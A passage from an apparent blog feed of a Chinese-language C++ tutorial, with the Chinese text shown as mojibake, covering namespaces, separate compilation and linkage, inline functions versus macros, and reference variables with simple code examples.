æ–‡ä»¶æˆ–å‡½æ•°å†…éƒ¨ä½¿ç”¨ <code>using</code> å£°æ˜æˆ–æŒ‡ä»¤</strong>ï¼šé¿å…åœ¨å¤´æ–‡ä»¶ï¼ˆ<code>.h</code> æˆ– <code>.hpp</code>ï¼‰çš„é¡¶å±‚ä½¿ç”¨ <code>using</code> æŒ‡ä»¤ï¼Œå› ä¸ºå®ƒä¼šå½±å“æ‰€æœ‰åŒ…å«è¯¥å¤´æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¯èƒ½å¯¼è‡´æ„æƒ³ä¸åˆ°çš„åç§°å†²çªã€‚</li><li> <strong>å°†è‡ªå·±çš„ä»£ç æ”¾å…¥åç§°ç©ºé—´</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ï¼Œç‰¹åˆ«æ˜¯å½“ä½ ç¼–å†™å¯èƒ½è¢«ä»–äººé‡ç”¨çš„ä»£ç æ—¶ã€‚</li></ol><p>ç†è§£å’Œæ­£ç¡®ä½¿ç”¨åç§°ç©ºé—´å¯¹äºç¼–å†™å¥å£®ã€å¯ç»´æŠ¤çš„C++ä»£ç è‡³å…³é‡è¦ã€‚</p><h2 id="9-4-æ€»ç»“"><a href="#9-4-æ€»ç»“" class="headerlink" title="9.4 æ€»ç»“"></a>9.4 æ€»ç»“</h2><p>æœ¬ç« æ¢è®¨äº†C++å¦‚ä½•ç®¡ç†ç¨‹åºä¸­çš„å†…å­˜å’Œåç§°ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¶‰åŠå¤šä¸ªæ–‡ä»¶çš„å¤§å‹é¡¹ç›®ä¸­ã€‚è¿™äº›æœºåˆ¶å¯¹äºç¼–å†™ç»“æ„æ¸…æ™°ã€å¯ç»´æŠ¤ä¸”å¯æ‰©å±•çš„C++ä»£ç è‡³å…³é‡è¦ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p> <strong>å•ç‹¬ç¼–è¯‘ (Separate Compilation):</strong> C++å…è®¸å°†ç¨‹åºåˆ†è§£ä¸ºå¤šä¸ªæºæ–‡ä»¶ï¼ˆ<code>.cpp</code>ï¼‰å’Œå¤´æ–‡ä»¶ï¼ˆ<code>.h</code> æˆ– <code>.hpp</code>ï¼‰ã€‚æºæ–‡ä»¶åŒ…å«å‡½æ•°çš„å…·ä½“å®ç°æˆ–å˜é‡çš„å®šä¹‰ï¼Œè€Œå¤´æ–‡ä»¶é€šå¸¸åŒ…å«å£°æ˜ï¼ˆå¦‚å‡½æ•°åŸå‹ã€ç±»å®šä¹‰ã€å¸¸é‡å£°æ˜ã€æ¨¡æ¿ç­‰ï¼‰ã€‚æ¯ä¸ªæºæ–‡ä»¶å¯ä»¥è¢«ç‹¬ç«‹ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼ˆ<code>.obj</code> æˆ– <code>.o</code>ï¼‰ï¼Œæœ€åç”±é“¾æ¥å™¨å°†è¿™äº›ç›®æ ‡æ–‡ä»¶ä»¥åŠæ‰€éœ€çš„åº“æ–‡ä»¶ç»„åˆæˆæœ€ç»ˆçš„å¯æ‰§è¡Œç¨‹åºã€‚è¿™ç§æ–¹å¼æé«˜äº†ç¼–è¯‘æ•ˆç‡ï¼Œå¹¶ä½¿å¾—ä»£ç æ¨¡å—åŒ–å’Œé‡ç”¨æ›´åŠ æ–¹ä¾¿ã€‚</p></li><li><p><strong>å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§ (Storage Duration, Scope, and Linkage):</strong></p><ul><li>  <strong>å­˜å‚¨æŒç»­æ€§</strong>å†³å®šäº†å˜é‡æˆ–å¯¹è±¡åœ¨å†…å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ã€‚ä¸»è¦æœ‰ï¼šè‡ªåŠ¨å­˜å‚¨ï¼ˆå‡½æ•°å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼Œéšå‡½æ•°è°ƒç”¨åˆ›å»ºå’Œé”€æ¯ï¼‰ã€é™æ€å­˜å‚¨ï¼ˆç¨‹åºè¿è¡ŒæœŸé—´ä¸€ç›´å­˜åœ¨ï¼Œå¦‚å…¨å±€å˜é‡æˆ–ç”¨ <code>static</code> ä¿®é¥°çš„å˜é‡ï¼‰ã€çº¿ç¨‹å­˜å‚¨ï¼ˆC++11å¼•å…¥ï¼Œä¸ç‰¹å®šçº¿ç¨‹ç”Ÿå‘½å‘¨æœŸç›¸å…³ï¼‰å’ŒåŠ¨æ€å­˜å‚¨ï¼ˆä½¿ç”¨ <code>new</code> åˆ†é…ï¼Œ<code>delete</code> é‡Šæ”¾ï¼‰ã€‚</li><li>  <strong>ä½œç”¨åŸŸ</strong>å®šä¹‰äº†ç¨‹åºä¸­å¯ä»¥è®¿é—®ä¸€ä¸ªåç§°ï¼ˆå˜é‡ã€å‡½æ•°ç­‰ï¼‰çš„åŒºåŸŸã€‚ä¸»è¦æœ‰ï¼šå—ä½œç”¨åŸŸï¼ˆ<code>&#123;&#125;</code>å†…éƒ¨ï¼‰ã€å‡½æ•°ä½œç”¨åŸŸï¼ˆä»…ç”¨äº <code>goto</code> æ ‡ç­¾ï¼‰ã€å‡½æ•°åŸå‹ä½œç”¨åŸŸï¼ˆä»…ç”¨äºå‚æ•°åï¼‰ã€æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€ä½œç”¨åŸŸï¼‰å’Œç±»ä½œç”¨åŸŸã€‚</li><li>  <strong>é“¾æ¥æ€§</strong>å†³å®šäº†åœ¨ä¸åŒæ–‡ä»¶æˆ–ç¼–è¯‘å•å…ƒä¸­å£°æ˜çš„åŒåæ ‡è¯†ç¬¦æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå®ä½“ã€‚ä¸»è¦æœ‰ï¼šå¤–éƒ¨é“¾æ¥ï¼ˆå¯åœ¨å¤šä¸ªæ–‡ä»¶ä¸­å…±äº«ï¼Œå¦‚æ™®é€šå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰ã€å†…éƒ¨é“¾æ¥ï¼ˆä»…åœ¨å½“å‰æ–‡ä»¶å†…å¯è§ï¼Œå¦‚ç”¨ <code>static</code> ä¿®é¥°çš„å…¨å±€å˜é‡/å‡½æ•°æˆ–æœªå‘½åç©ºé—´ä¸­çš„æˆå‘˜ï¼‰å’Œæ— é“¾æ¥ï¼ˆå¦‚å±€éƒ¨å˜é‡ï¼‰ã€‚<code>extern</code> å…³é”®å­—å¯ç”¨äºå¼•ç”¨å…¶ä»–æ–‡ä»¶ä¸­å…·æœ‰å¤–éƒ¨é“¾æ¥çš„å˜é‡ã€‚</li></ul></li><li><p><strong>åç§°ç©ºé—´ (Namespaces):</strong> ä¸ºäº†è§£å†³å¤§å‹é¡¹ç›®ä¸­å¯èƒ½å‡ºç°çš„åç§°å†²çªé—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œä¸åŒåº“å®šä¹‰äº†åŒåçš„å‡½æ•°æˆ–ç±»ï¼‰ï¼ŒC++å¼•å…¥äº†åç§°ç©ºé—´ã€‚</p><ul><li>  ä½¿ç”¨ <code>namespace</code> å…³é”®å­—å¯ä»¥åˆ›å»ºå…·åçš„ä»£ç åŒºåŸŸã€‚</li><li>  è®¿é—®åç§°ç©ºé—´æˆå‘˜å¯ä»¥é€šè¿‡ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>ï¼ˆå¦‚ <code>std::cout</code>ï¼‰ã€<code>using</code> å£°æ˜ï¼ˆå¦‚ <code>using std::cout;</code>ï¼‰æˆ– <code>using</code> æŒ‡ä»¤ï¼ˆå¦‚ <code>using namespace std;</code>ï¼‰ã€‚</li><li>  C++æ ‡å‡†åº“çš„æ‰€æœ‰åŠŸèƒ½éƒ½ä½äº <code>std</code> åç§°ç©ºé—´ä¸­ã€‚</li><li>  æœªå‘½åçš„åç§°ç©ºé—´æä¾›äº†ä¸€ç§åˆ›å»ºå…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„å®ä½“çš„æ–¹æ³•ï¼Œæ˜¯æ›¿ä»£æ–‡ä»¶ä½œç”¨åŸŸ <code>static</code> çš„ç°ä»£æ–¹å¼ã€‚</li></ul></li></ol><p>æŒæ¡è¿™äº›æ¦‚å¿µæœ‰åŠ©äºæ›´å¥½åœ°ç»„ç»‡ä»£ç ï¼Œç†è§£å˜é‡å’Œå‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸä¸å¯è§æ€§ï¼Œå¹¶æœ‰æ•ˆé¿å…åç§°å†²çªï¼Œä»è€Œæ„å»ºæ›´å¥å£®ã€æ›´æ¨¡å—åŒ–çš„C++åº”ç”¨ç¨‹åºã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 8 å‡½æ•°è¿›é˜¶</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_8/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_8/</url>
      
        <content type="html"><![CDATA[<h2 id="8-1-C-å†…è”å‡½æ•°"><a href="#8-1-C-å†…è”å‡½æ•°" class="headerlink" title="8.1 C++ å†…è”å‡½æ•°"></a>8.1 C++ å†…è”å‡½æ•°</h2><p>å¸¸è§„çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹æ¶‰åŠä¸€äº›å¼€é”€ï¼šç¨‹åºéœ€è¦è·³è½¬åˆ°å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œä¿å­˜å½“å‰æ‰§è¡ŒçŠ¶æ€ï¼ˆå¦‚å¯„å­˜å™¨å€¼ï¼‰ï¼Œå°†å‚æ•°å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæ‰§è¡Œå‡½æ•°ä»£ç ï¼Œå­˜å‚¨è¿”å›å€¼ï¼Œæ¢å¤æ‰§è¡ŒçŠ¶æ€ï¼Œç„¶åè·³è½¬å›è°ƒç”¨ç‚¹ã€‚å¯¹äºéå¸¸çŸ­å°ä¸”é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™äº›å¼€é”€å¯èƒ½ä¼šå˜å¾—æ˜¾è‘—ï¼Œå½±å“ç¨‹åºæ€§èƒ½ã€‚</p><p><strong>å†…è”å‡½æ•° (Inline Function)</strong> æ˜¯ C++ æä¾›çš„ä¸€ç§ä¼˜åŒ–æœºåˆ¶ï¼Œæ—¨åœ¨å‡å°‘è¿™ç§å‡½æ•°è°ƒç”¨å¼€é”€ã€‚å…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šå»ºè®®ç¼–è¯‘å™¨åœ¨<strong>ç¼–è¯‘æ—¶</strong>å°†å‡½æ•°çš„å®é™…ä»£ç ç›´æ¥<strong>æ›¿æ¢</strong>åˆ°æ¯ä¸ªè°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå¸¸è§„çš„å‡½æ•°è°ƒç”¨è·³è½¬ã€‚</p><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>è¦å»ºè®®ç¼–è¯‘å™¨å°†ä¸€ä¸ªå‡½æ•°è§†ä¸ºå†…è”å‡½æ•°ï¼Œå¯ä»¥åœ¨å‡½æ•°å®šä¹‰å‰åŠ ä¸Š <code>inline</code> å…³é”®å­—ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªç®€å•çš„å†…è”å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å†…è”å‡½æ•°</span></span><br><span class="line">    b = square(a); <span class="comment">// ç¼–è¯‘å™¨å¯èƒ½ä¼šå°†è¿™é‡Œæ›¿æ¢ä¸º: b = a * a;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, a squared = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> c = square(<span class="number">1.5</span> + <span class="number">2.5</span>); <span class="comment">// ç¼–è¯‘å™¨å¯èƒ½ä¼šæ›¿æ¢ä¸º: double c = (1.5 + 2.5) * (1.5 + 2.5);</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(1.5 + 2.5) squared = &quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ul><li>  <code>square</code> å‡½æ•°è¢«å£°æ˜ä¸º <code>inline</code>ã€‚</li><li>  åœ¨ <code>main</code> å‡½æ•°ä¸­è°ƒç”¨ <code>square(a)</code> æ—¶ï¼Œç¼–è¯‘å™¨<strong>å¯èƒ½</strong>ä¼šç›´æ¥ç”¨ <code>a * a</code> çš„ä»£ç æ›¿æ¢è¿™æ¬¡è°ƒç”¨ï¼Œé¿å…äº†å‡½æ•°è°ƒç”¨çš„å¼€é”€ã€‚</li><li>  åŒæ ·ï¼Œ<code>square(1.5 + 2.5)</code> å¯èƒ½è¢«æ›¿æ¢ä¸º <code>(1.5 + 2.5) * (1.5 + 2.5)</code>ã€‚</li></ul><h3 id="inline-çš„ç‰¹æ€§å’Œæ³¨æ„äº‹é¡¹"><a href="#inline-çš„ç‰¹æ€§å’Œæ³¨æ„äº‹é¡¹" class="headerlink" title="inline çš„ç‰¹æ€§å’Œæ³¨æ„äº‹é¡¹"></a><code>inline</code> çš„ç‰¹æ€§å’Œæ³¨æ„äº‹é¡¹</h3><ol><li><p> <strong>å»ºè®®è€Œéå‘½ä»¤:</strong> <code>inline</code> å…³é”®å­—åªæ˜¯å‘ç¼–è¯‘å™¨æå‡ºçš„ä¸€ä¸ª<strong>å»ºè®®</strong>ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®è‡ªå·±çš„ä¼˜åŒ–ç­–ç•¥æ¥å†³å®šæ˜¯å¦çœŸçš„è¿›è¡Œå†…è”ã€‚å¦‚æœå‡½æ•°ä½“è¿‡äºå¤æ‚ï¼ˆä¾‹å¦‚åŒ…å«å¾ªç¯ã€é€’å½’ã€å¤§é‡ä»£ç ï¼‰ï¼Œæˆ–è€…ç¼–è¯‘å™¨è®¤ä¸ºå†…è”ä¸ä¼šå¸¦æ¥å¥½å¤„ï¼ˆç”šè‡³å¯èƒ½æœ‰å®³ï¼‰ï¼Œå®ƒå¯èƒ½ä¼šå¿½ç•¥ <code>inline</code> å»ºè®®ï¼Œä»ç„¶æ‰§è¡Œå¸¸è§„çš„å‡½æ•°è°ƒç”¨ã€‚</p></li><li><p> <strong>é€‚ç”¨äºå°å‹å‡½æ•°:</strong> å†…è”æœ€é€‚åˆé‚£äº›ä»£ç é‡å°ã€æ‰§è¡Œé€Ÿåº¦å¿«ä¸”è¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ã€‚å¦‚æœå†…è”ä¸€ä¸ªå¤§å‡½æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœ€ç»ˆç”Ÿæˆçš„å¯æ‰§è¡Œä»£ç ä½“ç§¯æ˜¾è‘—å¢å¤§ï¼ˆä»£ç è†¨èƒ€ï¼‰ï¼Œåè€Œé™ä½æ€§èƒ½ï¼ˆå› ä¸ºæ›´å¤§çš„ä»£ç å¯èƒ½å¯¼è‡´æ›´å¤šçš„ç¼“å­˜æœªå‘½ä¸­ï¼‰ã€‚</p></li><li><p><strong>å®šä¹‰ä½ç½®:</strong> ä¸ºäº†è®©ç¼–è¯‘å™¨èƒ½å¤Ÿåœ¨è°ƒç”¨ç‚¹å±•å¼€å‡½æ•°ä»£ç ï¼Œå†…è”å‡½æ•°çš„<strong>å®šä¹‰</strong>ï¼ˆè€Œä¸ä»…ä»…æ˜¯åŸå‹ï¼‰é€šå¸¸éœ€è¦æ”¾åœ¨è°ƒç”¨è¯¥å‡½æ•°çš„æ¯ä¸ªæºæ–‡ä»¶ä¸­ã€‚æœ€å¸¸è§çš„åšæ³•æ˜¯å°†å†…è”å‡½æ•°çš„å®šä¹‰ç›´æ¥æ”¾åœ¨<strong>å¤´æ–‡ä»¶</strong>ä¸­ã€‚è¿™æ ·ï¼ŒåŒ…å«è¯¥å¤´æ–‡ä»¶çš„æ‰€æœ‰æºæ–‡ä»¶éƒ½èƒ½çœ‹åˆ°å®Œæ•´çš„å‡½æ•°å®šä¹‰ï¼Œç¼–è¯‘å™¨å°±æœ‰æœºä¼šè¿›è¡Œå†…è”ã€‚</p><ul><li>  æ³¨æ„ï¼šå°†å‡½æ•°å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­å¯¹äºéå†…è”å‡½æ•°é€šå¸¸æ˜¯é”™è¯¯çš„ï¼ˆä¼šå¯¼è‡´é“¾æ¥é”™è¯¯ï¼Œå› ä¸ºåŒä¸€ä¸ªå‡½æ•°ä¼šåœ¨å¤šä¸ªç¼–è¯‘å•å…ƒä¸­å®šä¹‰ï¼‰ï¼Œä½†å¯¹äºå†…è”å‡½æ•°æ˜¯å…è®¸ä¸”å¿…è¦çš„ã€‚</li></ul></li><li><p><strong>ç±»å®šä¹‰ä¸­çš„å‡½æ•°:</strong> åœ¨ç±»ï¼ˆ<code>class</code> æˆ– <code>struct</code>ï¼‰å®šä¹‰å†…éƒ¨å®ç°çš„æˆå‘˜å‡½æ•°<strong>é»˜è®¤</strong>å°±æ˜¯å†…è”çš„ï¼Œä¸éœ€è¦æ˜¾å¼æ·»åŠ  <code>inline</code> å…³é”®å­—ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> value; &#125; <span class="comment">// é»˜è®¤æ˜¯å†…è”çš„</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å†…è”å‡½æ•°-vs-å®-define"><a href="#å†…è”å‡½æ•°-vs-å®-define" class="headerlink" title="å†…è”å‡½æ•° vs. å® (#define)"></a>å†…è”å‡½æ•° vs. å® (<code>#define</code>)</h3><p>åœ¨ C è¯­è¨€ä¸­ï¼Œæœ‰æ—¶ä¼šä½¿ç”¨å¸¦å‚æ•°çš„å®ï¼ˆ<code>#define</code>ï¼‰æ¥æ¨¡æ‹Ÿç±»ä¼¼å†…è”å‡½æ•°çš„æ•ˆæœï¼Œä»¥é¿å…å‡½æ•°è°ƒç”¨å¼€é”€ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SQUARE(X) ((X)*(X)) <span class="comment">// C é£æ ¼å®</span></span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œå®å­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼š</p><ul><li>  <strong>ç±»å‹ä¸å®‰å…¨:</strong> å®åªæ˜¯ç®€å•çš„æ–‡æœ¬æ›¿æ¢ï¼Œä¸è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚</li><li>  <strong>æ„å¤–çš„å‰¯ä½œç”¨:</strong> å¦‚æœå‚æ•°å¸¦æœ‰å‰¯ä½œç”¨ï¼ˆå¦‚ <code>SQUARE(i++)</code>ï¼‰ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœï¼Œå› ä¸ºå‚æ•°ä¼šè¢«å¤šæ¬¡æ±‚å€¼ (<code>((i++)*(i++))</code>ï¼‰ã€‚</li><li>  <strong>è°ƒè¯•å›°éš¾:</strong> å®åœ¨é¢„å¤„ç†é˜¶æ®µå°±è¢«æ›¿æ¢æ‰äº†ï¼Œè°ƒè¯•å™¨é€šå¸¸çœ‹ä¸åˆ°å®çš„åŸå§‹å½¢å¼ã€‚</li><li>  <strong>ä½œç”¨åŸŸé—®é¢˜:</strong> å®ä¸å— C++ çš„ä½œç”¨åŸŸè§„åˆ™çº¦æŸã€‚</li></ul><p>å†…è”å‡½æ•°å…‹æœäº†è¿™äº›ç¼ºç‚¹ï¼š</p><ul><li>  <strong>ç±»å‹å®‰å…¨:</strong> å†…è”å‡½æ•°éµå¾ªæ­£å¸¸çš„å‡½æ•°ç±»å‹æ£€æŸ¥è§„åˆ™ã€‚</li><li>  <strong>å‚æ•°æ±‚å€¼:</strong> å‚æ•°åªä¼šè¢«æ±‚å€¼ä¸€æ¬¡ã€‚</li><li>  <strong>å¯è°ƒè¯•:</strong> å†…è”å‡½æ•°ä»ç„¶æ˜¯çœŸæ­£çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨è°ƒè¯•å™¨è¿›è¡Œè°ƒè¯•ï¼ˆå°½ç®¡å†…è”åçš„ä»£ç å¯èƒ½çœ‹èµ·æ¥ä¸åŒï¼‰ã€‚</li><li>  <strong>éµå¾ªä½œç”¨åŸŸ:</strong> å†…è”å‡½æ•°éµå¾ª C++ çš„ä½œç”¨åŸŸå’Œè®¿é—®è§„åˆ™ã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨ C++ ä¸­ï¼Œåº”ä¼˜å…ˆä½¿ç”¨å†…è”å‡½æ•°è€Œä¸æ˜¯å¸¦å‚æ•°çš„å®æ¥å®ç°ç®€å•çš„ã€éœ€è¦é¿å…è°ƒç”¨å¼€é”€çš„åŠŸèƒ½ã€‚</p><p><strong>æ€»ç»“:</strong></p><p>å†…è”å‡½æ•°æ˜¯ C++ æä¾›çš„ä¸€ç§æ€§èƒ½ä¼˜åŒ–å»ºè®®ï¼Œé€šè¿‡åœ¨ç¼–è¯‘æ—¶å°†å‡½æ•°ä»£ç æ›¿æ¢åˆ°è°ƒç”¨ç‚¹æ¥å‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ã€‚å®ƒç‰¹åˆ«é€‚ç”¨äºçŸ­å°ä¸”é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ã€‚<code>inline</code> å…³é”®å­—åªæ˜¯ä¸€ä¸ªå»ºè®®ï¼Œç¼–è¯‘å™¨æœ‰æœ€ç»ˆå†³å®šæƒã€‚ä¸ºäº†ä½¿å†…è”æˆä¸ºå¯èƒ½ï¼Œé€šå¸¸éœ€è¦å°†å†…è”å‡½æ•°çš„å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ç›¸æ¯” C é£æ ¼çš„å®ï¼Œå†…è”å‡½æ•°æä¾›äº†ç±»å‹å®‰å…¨å’Œæ›´å¯é¢„æµ‹çš„è¡Œä¸ºã€‚</p><h2 id="8-2-å¼•ç”¨å˜é‡"><a href="#8-2-å¼•ç”¨å˜é‡" class="headerlink" title="8.2 å¼•ç”¨å˜é‡"></a>8.2 å¼•ç”¨å˜é‡</h2><p>C++ å¼•å…¥äº†ä¸€ç§æ–°çš„å¤åˆç±»å‹â€”â€”<strong>å¼•ç”¨ (Reference)**ã€‚å¼•ç”¨æ˜¯å·²å®šä¹‰å˜é‡çš„</strong>åˆ«å (alias)**ã€‚å®ƒæä¾›äº†ä¸€ç§é—´æ¥è®¿é—®å˜é‡çš„æ–¹å¼ï¼Œä½†è¯­æ³•æ¯”æŒ‡é’ˆæ›´ç®€æ´ã€‚ä¸€æ—¦å¼•ç”¨è¢«åˆå§‹åŒ–æŒ‡å‘ä¸€ä¸ªå˜é‡ï¼Œå®ƒå°±ä¸èƒ½å†å¼•ç”¨å…¶ä»–å˜é‡ï¼Œå¹¶ä¸”å¯¹å¼•ç”¨çš„æ‰€æœ‰æ“ä½œå®é™…ä¸Šéƒ½ä½œç”¨äºå®ƒæ‰€å¼•ç”¨çš„åŸå§‹å˜é‡ã€‚</p><h3 id="8-2-1-åˆ›å»ºå¼•ç”¨å˜é‡"><a href="#8-2-1-åˆ›å»ºå¼•ç”¨å˜é‡" class="headerlink" title="8.2.1 åˆ›å»ºå¼•ç”¨å˜é‡"></a>8.2.1 åˆ›å»ºå¼•ç”¨å˜é‡</h3><p>å¼•ç”¨å˜é‡åœ¨å£°æ˜æ—¶å¿…é¡»è¢«åˆå§‹åŒ–ï¼Œå¹¶ä¸”å…¶ç±»å‹å¿…é¡»ä¸å®ƒæ‰€å¼•ç”¨çš„å˜é‡ç±»å‹ç›¸åŒ¹é…ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&amp; reference_name = existing_variable;</span><br></pre></td></tr></table></figure><ul><li>  <code>type</code>: å˜é‡çš„ç±»å‹ã€‚</li><li>  <code>&amp;</code>: å¼•ç”¨å£°æ˜ç¬¦ï¼Œç´§è·Ÿåœ¨ç±»å‹åä¹‹åã€‚</li><li>  <code>reference_name</code>: å¼•ç”¨çš„åç§°ã€‚</li><li>  <code>existing_variable</code>: å¼•ç”¨æ‰€æŒ‡å‘çš„å·²å­˜åœ¨çš„å˜é‡ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rats = <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span>&amp; rodents = rats; <span class="comment">// rodents æ˜¯ rats çš„ä¸€ä¸ªå¼•ç”¨ (åˆ«å)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: rats = 101, rodents = 101</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹å¼•ç”¨è¿›è¡Œæ“ä½œï¼Œå®é™…ä¸Šæ˜¯æ“ä½œåŸå§‹å˜é‡</span></span><br><span class="line">    rodents++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After rodents++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats; <span class="comment">// rats 